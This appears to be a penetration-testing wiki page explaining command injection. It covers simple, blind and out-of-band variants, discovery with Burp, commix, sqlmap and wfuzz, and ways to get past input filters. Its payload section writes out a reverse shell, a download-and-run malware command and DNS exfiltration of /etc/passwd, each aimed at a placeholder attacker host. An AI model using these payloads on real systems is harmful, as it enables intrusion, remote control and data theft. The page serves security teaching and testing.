# 3. Command Injection

## Index

* \[\[Back End Vulnerabilities]]
  * \[\[1. Insecure File Uploads]]
  * \[\[2. File Inclusion]]
  * \[\[3. Command Injection]]
  * \[\[4. SQL Injection (SQLi)]]
  * \[\[5. Server-Side Request Forgery (SSRF)]]
  * \[\[6. Server-Side Template Injection (SSTi)]]
  * \[\[7. XML External Entity (XXE)]]
  * \[\[8. Insecure Deserialization]]

## Command Injection

Command Injection is a critical vulnerability that occurs when an application passes untrusted, user-supplied input to a system shell without proper sanitization or validation. This allows an attacker to execute arbitrary system commands on the host operating system. This attack is highly dangerous because, depending on the permissions of the application, an attacker could gain full control of the server, steal sensitive information, install malware, escalate privileges, or pivot to other systems on the network.

This vulnerability often occurs in applications that rely on system commands to perform tasks like file management, network diagnostics (e.g., ping, traceroute), or interacting with system utilities. If the application uses shell commands and incorporates user input without filtering dangerous characters (like `;`, `|`, `&&`), it opens the door for command injection attacks.

## How Command Injection Works

Command Injection vulnerabilities exploit the lack of proper input validation in applications that use system commands. Hereâ€™s a breakdown of how it works:

1. **User Input Collected:** The attacker identifies a field where the application takes input from a user and passes it to a shell command. This could be via URL parameters, web forms, headers, or cookies.
   * Example: A web application might accept an IP address for a ping command, using `ping <user_input>`, where the `<user_input>` is directly passed to the shell.
2. **Shell Metacharacter Injection:** Instead of providing a benign input like an IP address, the attacker inputs malicious shell commands using control characters like `;`, `|`, `&&`, or `||`.
   * Example: The attacker might input `127.0.0.1; cat /etc/passwd`, which results in the execution of both the ping and the `cat /etc/passwd` command.
3. **Command Execution:** The application executes the shell command along with the injected malicious command. The shell interpreter processes both the legitimate and injected commands.
   *   Example: The system interprets the following:

       ```
       ping 127.0.0.1; cat /etc/passwd
       ```

       Here, both the ping command and the malicious command to read the `/etc/passwd` file are executed.
4. **Attacker Gains Control:** The output of the command is returned to the attacker (in the case of non-blind command injection). If the attacker has full control over the system shell, they can execute any commands, including downloading malware, creating backdoors, or escalating privileges.

## Types of Command Injection

Command Injection can be exploited in several different ways depending on the attacker's goal and the application's behavior. Below are the primary types of Command Injection:

### Simple Command Injection

*   This is the most straightforward type of Command Injection, where the attacker injects commands using shell metacharacters to execute additional commands sequentially.

    #### How Simple Command Injection Works

    1. The attacker finds an input field that is passed directly to a system command.
    2. They inject a command using a metacharacter like `;`.
    3. The system executes both the legitimate and injected commands.

    **Example:**

    ```
    http://<target_domain>/ping?ip=127.0.0.1;ls
    ```

    This executes the ping command followed by the `ls` command, listing directory contents.

### Blind Command Injection

*   In blind command injection, the output of the injected commands is not returned directly to the attacker. Instead, the attacker has to rely on indirect indicators, such as timing delays or network interactions, to infer the success of the attack.

    #### How Blind Command Injection Works

    1. The attacker injects commands that produce observable side effects.
    2. Instead of visible output, they observe delays, DNS requests, or other indicators.

    **Example:**

    ```
    http://<target_domain>/ping?ip=127.0.0.1;sleep 10
    ```

    If the application takes 10 seconds to respond, the attacker knows the command was executed.

### Out-of-Band (OOB) Command Injection

*   This variant involves exploiting secondary communication channels (such as DNS or HTTP requests) to retrieve command output or exfiltrate data from the server.

    #### How OOB Command Injection Works

    1. The attacker injects a command that sends data to an external server they control.
    2. Data is retrieved via secondary channels like DNS or HTTP requests.

    **Example:**

    ```
    http://<target_domain>/ping?ip=127.0.0.1; nslookup $(whoami).<attacker_domain>
    ```

    This command sends the result of `whoami` to an external DNS server.

## Manual Discovery Techniques for Command Injection

To manually discover Command Injection vulnerabilities in a web application, you can use a combination of manual techniques and automated tools:

### 1. Inspect Input Points

* Look for any user input (forms, URL parameters, cookies) that is passed to system commands. Common examples include:
  * Network diagnostic tools (ping, traceroute, nslookup).
  * File processing utilities (gzip, tar, etc.).
  * File management systems (file upload/download).

### 2. Test for Command Injection Using Shell Metacharacters

*   Manually input shell metacharacters (`;`, `&&`, `|`, `||`) into any parameters that are likely used in system commands.

    **Example:**

    ```
    http://<target_domain>/ping?ip=127.0.0.1;ls
    ```

    If the output of the injected command (e.g., directory listing) is returned, the application is vulnerable.

### 3. Use Burp Suite for Interception and Manipulation

*   Intercept HTTP requests with Burp Suite and modify input fields to inject shell commands.

    **Example:**\
    Intercept a request like this:

    ```
    POST /ping HTTP/1.1
    Host: <target_domain>
    Content-Type: application/x-www-form-urlencoded

    ip=127.0.0.1
    ```

    Modify it to:

    ```
    ip=127.0.0.1;ls
    ```

    If directory contents are displayed, it confirms the vulnerability.

### 4. Blind Command Injection Testing

*   For blind Command Injection, inject timing-based commands (`sleep`, `ping`, etc.) to observe response delays.

    **Example:**

    ```
    http://<target_domain>/ping?ip=127.0.0.1;sleep 10
    ```

    If the server delays its response by 10 seconds, the injection was successful.

### 5. Automated Discovery with Tools

*   **Commix:** An automated tool to discover and exploit command injection vulnerabilities.

    ```
    commix --url="http://<target_domain>/ping?ip=127.0.0.1"
    ```
*   **SQLMap** (OS Command Injection mode): Use SQLMap to test for OS command injection.

    ```
    sqlmap -u "http://<target_domain>/ping?ip=127.0.0.1" --os-cmd="whoami"
    ```

### 6. Fuzzing for Command Injection

*   Use fuzzing tools like `ffuf` or `wfuzz` to automatically test inputs for injection.

    **Example:**

    ```
    wfuzz -c -z file,/path/to/command-injection-payloads.txt --hc 404 "http://<target_domain>/ping?ip=FUZZ"
    ```

## Command Injection Payloads

Here are several common payloads for Command Injection:

### 1. Basic File Read

* Inject a command to read sensitive files:

```
127.0.0.1; cat /etc/passwd
```

### 2. Reverse Shell Payload

* Inject a command to establish a reverse shell:

```
127.0.0.1; bash -i >& /dev/tcp/<attack_ip>/4444 0>&1
```

### 3. Download and Execute Malware

* Inject a command to download and execute malware:

```
127.0.0.1; wget http://<attack_ip>/malware.sh -O /tmp/malware.sh; bash /tmp/malware.sh
```

### 4. DNS Exfiltration (Blind Command Injection)

* Exfiltrate sensitive data via DNS queries:

```
127.0.0.1; nslookup $(cat /etc/passwd) <attacker_domain>
```

### 5. Timing-Based Attack

* Use a timing delay to detect blind command injection:

```
127.0.0.1; sleep 10
```

## Bypassing Defenses

Command Injection defenses can often be bypassed with various techniques:

### 1. Input Obfuscation

* Obfuscate the payload using alternative metacharacters:

```
127.0.0.1 | cat /etc/passwd
```

### 2. Encoding Special Characters

* Use URL encoding to bypass input filters:

```
127.0.0.1%3Bcat%20/etc/passwd
```

### 3. Whitespace Manipulation

* Use special characters or environment variables instead of spaces:

```
127.0.0.1;cat$IFS/etc/passwd
```

### 4. Use of Environment Variables

* Use environment variables like `$PATH` to execute commands:

```
127.0.0.1; echo $PATH
```

### 5. Double Encoding

* Use double URL encoding to bypass input filters:

```
127.0.0.1%253Bcat%2520/etc/passwd
```

## Resources

| **Website**                             | **URL**                                                                             |
| --------------------------------------- | ----------------------------------------------------------------------------------- |
| OWASP Command Injection                 | https://owasp.org/www-community/attacks/Command\_Injection                          |
| PortSwigger Web Security Academy        | https://portswigger.net/web-security/os-command-injection                           |
| Commix Tool                             | https://github.com/commixproject/commix                                             |
| SQLMap                                  | https://sqlmap.org/                                                                 |
| PayloadAllTheThings (Command Injection) | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection |
| HackTricks Command Injection Guide      | https://book.hacktricks.xyz/pentesting-web/command-injection                        |
| GTFOBins                                | https://gtfobins.github.io/                                                         |
| Exploit Database                        | https://www.exploit-db.com/                                                         |
| FuzzDB                                  | https://github.com/fuzzdb-project/fuzzdb                                            |
